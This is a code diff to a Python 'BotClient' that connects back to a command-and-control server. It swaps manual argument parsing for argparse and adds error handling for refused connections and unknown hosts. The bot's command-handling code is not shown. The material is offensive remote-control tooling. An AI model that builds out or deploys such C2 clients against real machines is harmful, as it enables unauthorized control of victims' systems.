@@ -1,6 +1,7 @@
+import argparse
 import sys
-from subprocess import Popen, PIPE, run
-from socket import *
+from subprocess import run
+from socket import gaierror, socket, AF_INET, SOCK_STREAM
 from termcolor import colored
 
 default_port = 38433
@@ -25,18 +26,20 @@ class BotClient:
                     ["bold"],
                 )
             )
-        except IndexError:
-            print(
-                colored(
-                    f"Please provide the attacker's IP address as a command line argument.",
-                    "red",
-                )
-            )
-            exit()
         except ConnectionRefusedError:
             print(
                 colored(
-                    "Connection refused. Make sure the C2 server is listening on the specified port.",
+                    f"Connection refused. Make sure the C2 server is listening on the specified port({self.server_port}).",
+                    "red",
+                    "on_grey",
+                    ["bold"],
+                )
+            )
+            exit()
+        except gaierror as e:
+            print(
+                colored(
+                    f"Error: Specified server ({self.server_name}) not found. Please check your spelling and try again.",
                     "red",
                     "on_grey",
                     ["bold"],
@@ -83,34 +86,14 @@ class BotClient:
 
 
 def main():
-    if len(sys.argv) < 2:
-        print(
-            colored(
-                f"You have entered too few commandline arguments. Provide the C2 server address as the first argument and an optional port number as the second argument. The default port number is {default_port}",
-                "red",
-                "on_grey",
-                ["bold"],
-            )
-        )
-        return
-    elif len(sys.argv) == 2:
-        server_name = sys.argv[1]
-        server_port = default_port
-    elif len(sys.argv) == 3:
-        server_name = sys.argv[1]
-        server_port = int(sys.argv[2])
-    else:
-        print(
-            colored(
-                f"You have entered too many commandline arguments. Provide the C2 server address as the first argument and an optional port number as the second argument. The default port number is {default_port}",
-                "red",
-                "on_grey",
-                ["bold"],
-            )
-        )
-        return
+    parser = argparse.ArgumentParser(description="Bot Client")
+    parser.add_argument("--server", type=str, required=True, help="Server address")
+    parser.add_argument(
+        "--port", type=int, default=default_port, help="Port number (optional)"
+    )
+    args = parser.parse_args()
 
-    bot = BotClient(server_name, server_port)
+    bot = BotClient(args.server, args.port)
     try:
         bot.run()
     except BrokenPipeError:
